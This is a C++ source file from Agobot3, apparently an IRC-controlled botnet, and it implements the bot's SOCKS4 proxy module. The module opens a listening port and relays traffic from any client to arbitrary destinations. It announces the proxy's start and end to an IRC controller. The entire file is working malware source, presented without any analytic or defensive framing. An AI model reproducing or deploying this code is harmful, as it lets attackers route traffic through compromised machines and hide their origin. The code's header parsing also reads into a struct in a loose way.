/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "main.h"
#include "redir_socks.h"
#include "mainctrl.h"
#include "utility.h"

CRedirectSOCKS_Thread::CRedirectSOCKS_Thread() { m_szType="CRedirectSOCKS_Thread"; m_sRedirectName.Assign("redirsocks"); }

#define SOCKS4_CONNECT	1
#define SOCKS4_BIND		2
#define SOCKS4_GRANT	90
#define SOCKS4_REJECT	91

struct socks4_hdr {
	char vn;
	char cd;
	unsigned short destport;
	unsigned long destaddr;
	char userid[1024];
};

void CRedirectSOCKS_Thread::StartRedirect()
{	
	char svn;
	if(!m_sClientSocket.Recv(&svn, 1)) { m_sClientSocket.Disconnect(); return; }

	switch(svn)
	{
	case 69:
		break;
	case 4:
		{
			struct socks4_hdr hdr4; CSocket sServer;

			if(!m_sClientSocket.Recv(&hdr4.cd,sizeof(hdr4)-2)) { m_sClientSocket.Disconnect(); return; }

			if(hdr4.cd==SOCKS4_CONNECT)
			{
				sServer=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
				
				if(!sServer.Connect(hdr4.destaddr, hdr4.destport))
				{
					hdr4.vn=0; hdr4.cd=SOCKS4_REJECT;
					memset(&hdr4.userid, 0, 1024);
					m_sClientSocket.Write((char*)&hdr4, 8);
					m_sClientSocket.Disconnect();
					return;
				}

				hdr4.vn=0; hdr4.cd=SOCKS4_GRANT;
				memset(&hdr4.userid, 0, 1024);
				m_sClientSocket.Write((char*)&hdr4, 8);

				int iLen; char szBuf[1024]; fd_set fd;

				SET_SOCK_BLOCK(m_sClientSocket.GetSocket(), 0); SET_SOCK_BLOCK(sServer.GetSocket(), 0);

				while(true && g_pMainCtrl->m_bRunning)
				{
					sServer.Recv(szBuf, sizeof(szBuf), &iLen);
					if(!iLen) break; if(iLen<0 && ERRNO!=EWOULDBLOCK) { Sleep(10); continue; }
					m_sClientSocket.Write(szBuf, iLen);

					m_sClientSocket.Recv(szBuf, sizeof(szBuf), &iLen);
					if(!iLen) break; if(iLen<0 && ERRNO!=EWOULDBLOCK) { Sleep(10); continue; }
					sServer.Write(szBuf, iLen);
				}

				m_sClientSocket.Disconnect(); sServer.Disconnect();
			}

#ifdef DBGCONSOLE
			g_pMainCtrl->m_cConsDbg.Log(1, "CRedirectSOCKS(0x%8.8Xh): Finished redirect...\n", this);
#endif
		}
		break;
	default:
		break;
	}
}

CRedirectSOCKS::CRedirectSOCKS() { m_szType="CRedirectSOCKS"; m_sRedirectName.Assign("redirsocks"); }

void CRedirectSOCKS::StartRedirect()
{	g_pMainCtrl->m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: starting proxy on port %d.", \
								  m_sRedirectName.CStr(), m_iLocalPort);

	if(!m_sListenSocket.Bind(m_iLocalPort)) return;

	while(m_pRedirect->m_bRedirecting && g_pMainCtrl->m_bRunning)
	{	
		CSocket sClientSocket(true); 
		if(m_sListenSocket.Accept(sClientSocket))
		{
			CRedirectSOCKS_Thread *pTemp=new CRedirectSOCKS_Thread;
			pTemp->m_pRedirect=m_pRedirect; pTemp->m_pRedirSOCKS=this;
			pTemp->m_iLocalPort=m_iLocalPort; pTemp->m_sClientSocket=sClientSocket;
			pTemp->m_sReplyTo.Assign(m_sReplyTo); pTemp->m_bSilent=m_bSilent; pTemp->m_bNotice=m_bNotice;
			pTemp->Start(true); }
		else
		{	break; } }

	m_sListenSocket.Disconnect();


	g_pMainCtrl->m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: finished proxy on port %d.", \
								  m_sRedirectName.CStr(), m_iLocalPort); }
